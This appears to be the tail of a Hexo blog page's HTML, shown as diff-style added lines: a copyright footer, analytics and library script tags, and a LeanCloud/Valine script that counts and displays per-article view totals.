+});</script><div class="copyright"><p>© 2016 - 2024 <a href="https://weibo.com/316000381" target="_blank">typeR</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <br> and <a href="https://github.com/Bulandent/hexo-theme-bubuzou" target="_blank">hexo-theme-bubuzou</a></p><p> <span style="padding-right: 6px;">闽ICP备16007301号-2</span></p></div><div class="totop"><i></i></div></div></footer><script async src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-MML-AM_CHTML"></script><script src="https://bubuzou.oss-cn-shenzhen.aliyuncs.com/blog/202010/jquery-1.8.2.min.js"></script><script src="https://bubuzou.oss-cn-shenzhen.aliyuncs.com/blog/202010/articleCatalog.js"></script><script src="https://bubuzou.oss-cn-shenzhen.aliyuncs.com/blog/202010/main.js"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-65933410-1",'auto');ga('send','pageview');</script><script>const valineAPI = (() => {
+try {
+    AV.init("aD8jJBpu4oew3ovNY73z6Rdq-gzGzoHsz", "FdzS5SOPHdhYQoEUngQ8K2QW");
+} catch(error) {}
+const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+    query.equalTo("identity", identity);
+    query.find().then(results => {
+        resolve(results.length > 0);
+    }, error => reject(error));
+    })
+}
+
+const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+    let querys = [];
+    for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+    }
+    query = AV.Query.or.apply(null ,querys);
+    } else {
+    identity = identity || getRealPath();
+    query = new AV.Query("Timer");
+    query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+    query.find()
+    .then(results => resolve(results))
+    .catch(error => reject(error))
+    })
+}
+
+const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+    let Todo = AV.Object.extend('Timer');
+    let todo = new Todo();
+    todo.set("times", 1);
+    todo.set("identity", identity);
+    todo.save().then(res => resolve(true), error => reject(error));
+    })
+}
+
+const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+    let query = new AV.Query('Timer');
+    query.equalTo("identity", identity);
+    query.find().then(todos => {
+        todos.forEach(todo => {
+        todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+    }).then(todos => resolve(true), error => reject(error));
+    })
+}
+
+return {
+    isExist,
+    _get,
+    update,
+    create
+}
+})()
+
+const calcAndWriteTimes = () => {
+let isPost = true;
+
+let timerAllDOM = document.querySelectorAll(".article-timer");
+
+if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+    if(exist) {
+        return valineAPI.update(identity);
+    }
+    return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+}
+
+let timerDOMCache = {};
+
+for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+    timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+    timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+    };
+    }
+}
+
+let identities = Object.keys(timerDOMCache);
+valineAPI._get(identities).then(results => {
+    for(let result of results) {
+    let {identity, times} = result.attributes;
+    timerDOMCache[identity].times = times;
+    timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+    if(timerDOMCache[identity].times){
+        continue;
+    }
+    timerDOMCache[identity].dom.map(item => item.innerText = 1);
+    valineAPI.create(identity);
+    }
+}).catch(error => console.log(error.message))
+}
+
+if(true){
+calcAndWriteTimes();
+}</script></body></html>
